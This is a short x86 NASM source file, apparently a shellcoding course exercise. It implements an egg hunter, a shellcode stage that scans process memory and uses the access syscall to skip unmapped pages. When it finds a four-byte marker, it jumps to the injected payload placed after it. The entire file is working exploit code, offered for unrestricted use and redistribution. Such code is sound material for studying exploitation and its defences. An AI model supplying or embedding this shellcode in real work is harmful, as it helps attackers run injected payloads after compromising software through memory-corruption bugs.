; egghunter_access.nasm
; 
; Egg hunter to parse memory and deal with blank memory sections
;
; Author: SLAE - 891
;
; You are free to use and/or redistribute it without restriction

global _start
 
section .text
 
_start:

        xor ecx,ecx         ; ecx zeroed out
        mul ecx             ; clear eax, edx

 next_page:
        or bx, 0xfff        ; 0x1000 - 1 (4095)
        mov edi, dword 0x50905091
        dec edi

next_addr:
        inc ebx             ; +1 so we move to the next 4096 bytes (next page)
        push byte 0x21      ; access syscall
        pop eax
        int 0x80
 
        cmp al, 0xf2         ; check for EFAULT
        je _start            ; if EFAULT, we are going to the nextpage
        cmp dword [ebx], edi ; our egg mark
        jne next_addr        ; we are parsing the readable memory page
        lea eax, [ebx+4]     ; @ of the shellcode
        jmp eax